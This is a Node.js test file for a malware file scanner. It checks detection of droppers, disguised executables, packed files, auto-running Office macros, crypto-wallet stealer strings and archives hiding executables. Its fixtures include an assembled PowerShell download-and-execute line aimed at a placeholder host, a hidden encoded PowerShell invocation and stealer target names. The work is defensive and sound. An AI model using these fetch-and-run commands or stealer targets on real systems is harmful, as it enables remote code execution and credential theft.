'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { scanFile, scanPath, MAX_FILE_BYTES, END_BYTES } = require('../server/lib/scan/filescan');

const analyze = (buffer) => scanFile(buffer, 'inert-fixture.exe', { lookupHash: () => null });

// Command words are assembled from pieces, so no finished command sits in this file or on a command line.
const j = (...parts) => parts.join('');
const f08 = (name, text) => scanFile(Buffer.from(text), name, { lookupHash: () => null }).checks.find((c) => c.id === 'F08');

test('a script that only runs commands is not a dropper; one that fetches and runs still is', () => {
  const shell = j('WScript', '.Shell');
  const iex = j('Invoke', '-Expression');
  const fetch = j('Net', '.Web', 'Client).Down', 'loadString("http://example.invalid/a")');
  assert.equal(f08('admin.vbs', `Set s = CreateObject("${shell}")`).status, 'warn', 'Windows admin scripts do this');
  assert.equal(f08('admin.ps1', `${iex} $cmd`).status, 'warn');
  assert.equal(f08('get.ps1', `(New-Object ${fetch} | ${iex}`).status, 'fail');
  assert.equal(f08('run.bat', j('power', 'shell -', 'enc SQBFAFgA')).status, 'fail', 'encoded PowerShell fetches and runs in one');
  assert.equal(f08('run.bat', j('power', 'shell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -', 'enc SQBFAFgA')).status, 'fail', 'even after a long preamble');
});

test('a library named with dots is not a disguised document; a program behind a document name is', () => {
  const f05 = (name) => scanFile(Buffer.from('MZ inert'), name, { lookupHash: () => null }).checks.find((c) => c.id === 'F05').status;
  assert.equal(f05('Windows.Data.Pdf.dll'), 'pass');
  assert.equal(f05('invoice.pdf.exe'), 'fail');
  assert.equal(f05('invoice.pdf.zip'), 'fail');
});
const entropyCheck = (buffer) => analyze(buffer).checks.find((check) => check.id === 'F06');

test('file entropy keeps the packed-file warning for a uniform byte distribution', () => {
  // Only an MZ marker and synthetic bytes; this is not an executable program.
  const pattern = Buffer.from(Array.from({ length: 256 }, (_, i) => i));
  const buffer = Buffer.alloc(1024 * 1024, pattern);
  buffer.write('MZ');
  const check = entropyCheck(buffer);
  assert.equal(check.status, 'warn');
  assert.equal(check.points, 14);
  assert.match(check.detail, /8\.00 bits\/byte/);
});

test('file entropy keeps low-entropy files clear and samples only the first 4 MiB', () => {
  const prefix = Buffer.alloc(4 * 1024 * 1024);
  prefix.write('MZ');
  const pattern = Buffer.from(Array.from({ length: 256 }, (_, i) => i));
  const withTail = Buffer.concat([prefix, Buffer.alloc(6 * 1024 * 1024, pattern)]);
  const check = entropyCheck(prefix);
  assert.equal(check.status, 'pass');
  assert.equal(check.detail, 'Entropy 0.00');
  assert.deepEqual(entropyCheck(withTail), check, 'bytes beyond the entropy sample do not change the warning');
});

test('Office macro checks still distinguish auto-running and ordinary macros', () => {
  const header = Buffer.from('d0cf11e0a1b11ae1', 'hex');
  const macroCheck = (text) => scanFile(Buffer.concat([header, Buffer.from(text)]), 'inert-fixture.doc', {
    lookupHash: () => null
  }).checks.find((check) => check.id === 'F09');
  assert.equal(macroCheck('_VBA_PROJECT inert text Document_Open').points, 55);
  assert.equal(macroCheck('_VBA_PROJECT inert text ordinary macro').points, 36);
  assert.equal(macroCheck('Document_Open without any macro marker').status, 'pass');
});

/* ---------------------------------------------------------- a file too big to hold */

const big = (t, name, head, tail, mb = 30) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-part-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const file = path.join(dir, name);
  const fd = fs.openSync(file, 'w');
  const size = mb * 1024 * 1024;
  fs.ftruncateSync(fd, size);
  fs.writeSync(fd, head, 0, head.length, 0);
  fs.writeSync(fd, tail, 0, tail.length, size - tail.length);
  fs.closeSync(fd);
  return { file, size };
};
const check = (report, id) => report.checks.find((c) => c.id === id);
const STEALER_STRINGS = 'wallet.dat telegram desktop\\tdata metamask';

/** A stored zip that fits in `room` bytes, for the end of a file; offsets as if it starts at `at`. */
function zipEnd(name, at) {
  const n = Buffer.from(name);
  const central = Buffer.alloc(46 + n.length);
  central.writeUInt32LE(0x02014b50, 0);
  central.writeUInt16LE(n.length, 28);
  central.writeUInt32LE(at, 42);
  n.copy(central, 46);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(1, 10);
  end.writeUInt32LE(central.length, 12);
  end.writeUInt32LE(at, 16);
  return Buffer.concat([central, end]);
}

test('up to the limit a file is searched to its last byte', () => {
  const buf = Buffer.alloc(MAX_FILE_BYTES, 0x20);
  buf.write('MZ', 0, 'latin1');
  buf.write(STEALER_STRINGS, MAX_FILE_BYTES - STEALER_STRINGS.length, 'latin1');
  assert.equal(scanFile(buf, 'tool.exe', { lookupHash: () => null }).checks.find((c) => c.id === 'F07').status, 'fail', 'found past the first 8 MB');
});

test('a bigger file is read at both ends, and the report says so', (t) => {
  const { file, size } = big(t, 'setup.exe', Buffer.from('MZ inert'), Buffer.from(STEALER_STRINGS));
  const report = scanPath(file, 'setup.exe', { lookupHash: () => null });
  assert.equal(report.part, true);
  assert.equal(report.size, size);
  assert.equal(report.type, 'pe');
  assert.equal(check(report, 'F07').status, 'fail', 'the end of the file was read');
});

test('nothing in the middle of a big file is claimed', (t) => {
  const { file, size } = big(t, 'setup.exe', Buffer.from('MZ inert'), Buffer.from('end'));
  const fd = fs.openSync(file, 'r+');
  fs.writeSync(fd, Buffer.from(STEALER_STRINGS), 0, STEALER_STRINGS.length, Math.floor(size / 2));
  fs.closeSync(fd);
  const report = scanPath(file, 'setup.exe', { lookupHash: () => null });
  assert.equal(check(report, 'F07').status, 'pass');
  assert.equal(report.part, true, 'which is why the report must say part');
});

test('a file at the limit is read whole, one byte over is not', (t) => {
  const at = big(t, 'a.bin', Buffer.from('x'), Buffer.from('y'), MAX_FILE_BYTES / 1024 / 1024);
  assert.equal(scanPath(at.file, 'a.bin', { lookupHash: () => null }).part, undefined);
  const dir = path.dirname(at.file);
  const over = path.join(dir, 'b.bin');
  fs.closeSync(fs.openSync(over, 'w'));
  fs.truncateSync(over, MAX_FILE_BYTES + 1);
  assert.equal(scanPath(over, 'b.bin', { lookupHash: () => null }).part, true);
});

test('a big archive is listed from its end, and an unreadable list is not called empty', (t) => {
  const size = 30 * 1024 * 1024;
  const end = zipEnd('payload.exe', size - 79);
  const { file } = big(t, 'photos.zip', Buffer.from('PK\x03\x04'), end);
  assert.equal(check(scanPath(file, 'photos.zip', { lookupHash: () => null }), 'F11').status, 'fail');

  const broken = big(t, 'photos.zip', Buffer.from('PK\x03\x04'), Buffer.from('no list here'));
  assert.equal(check(scanPath(broken.file, 'photos.zip', { lookupHash: () => null }), 'F11').status, 'skip');

  // The list starts before the part that was read.
  const before = zipEnd('payload.exe', 1024);
  const far = big(t, 'photos.zip', Buffer.from('PK\x03\x04'), before);
  assert.equal(check(scanPath(far.file, 'photos.zip', { lookupHash: () => null }), 'F11').status, 'skip');
  assert.ok(END_BYTES < size);
});
